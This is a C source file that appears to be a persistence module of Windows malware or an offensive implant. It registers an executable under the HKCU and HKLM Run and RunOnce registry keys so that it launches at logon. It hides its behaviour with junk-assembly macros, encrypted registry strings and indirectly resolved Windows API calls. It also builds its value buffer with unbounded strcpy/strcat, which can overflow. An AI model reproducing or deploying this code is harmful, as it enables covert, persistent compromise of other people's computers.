#include "crypto.h"
#include "global_config.h"

#include <windows.h>
#include <string.h>
#include <stdio.h>

#include "junk_asm.h"
#include "functions_table.h"

#include "debug.h"

#pragma warning(disable:4996)

/*
"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
*/
/*
BOOL IsMyProgramRegisteredForStartup(char* pszAppName)
{
    ASM_JUNK

    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwRegType = REG_SZ;
    char szPathToExe[MAX_PATH] = {};
    DWORD dwSize = sizeof(szPathToExe);

    lResult = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        lResult = RegGetValueA(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
        fSuccess = (lResult == 0);
    }

    if (fSuccess)
    {
        fSuccess = (strlen(szPathToExe) > 0) ? TRUE : FALSE;
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}
*/


// TODO: add this one, https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/
BOOL run_and_runonce(char* pszAppName, char* pathToExe, char* args, int run_type)
{
    ASM_JUNK;

    DBG_MSG("run_and_runonce() - begin. run_type: %d\n", run_type);

    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH;
    char szValue[count];


    strcpy(szValue, "\"");
    strcat(szValue, pathToExe);
    strcat(szValue, "\" ");

    if (args != NULL)
    {
        // caller should make sure "args" is quoted if any single argument has a space
        // e.g. ("-name \"Mark Voidale\"");
        strcat(szValue, args);
    }

    //
    char* registry_run = NULL;
    decrypt_to_string(&registry_run, REGISTRY_RUN, REGISTRY_RUN_ENCRYPTED_LEN);

    DBG_MSG("run_and_runonce() - registry_run: %s\n", registry_run);

    //
    char* registry_runonce = NULL;
    decrypt_to_string(&registry_runonce, REGISTRY_RUNONCE, REGISTRY_RUNONCE_ENCRYPTED_LEN);

    DBG_MSG("run_and_runonce() - registry_runonce: %s\n", registry_runonce);

    //
        //
    switch (run_type) {
    case 1:
        lResult = l_RegCreateKeyExA(HKEY_CURRENT_USER, registry_run, 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
        break;
    case 2:
        lResult = l_RegCreateKeyExA(HKEY_CURRENT_USER, registry_runonce, 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
        break;
    case 3:
        lResult = l_RegCreateKeyExA(HKEY_LOCAL_MACHINE, registry_run, 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

        // fallback to hkcu
        if (lResult != ERROR_SUCCESS) {
            run_and_runonce(pszAppName, pathToExe, "", 1);
        }
        break;
    case 4:
        lResult = l_RegCreateKeyExA(HKEY_LOCAL_MACHINE, registry_runonce, 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

        // fallback to hkcu
        if (lResult != ERROR_SUCCESS) {
            run_and_runonce(pszAppName, pathToExe, "", 2);
        }
        break;

    default:
        DBG_MSG("run_and_runonce() - no run_type found for this value.\n");

        return false;
    }



    //
    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (strlen(szValue) + 1);


        //
        lResult = l_RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);


        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        l_RegCloseKey(hKey);

        hKey = NULL;
    }

    return fSuccess;
}


/*
*/
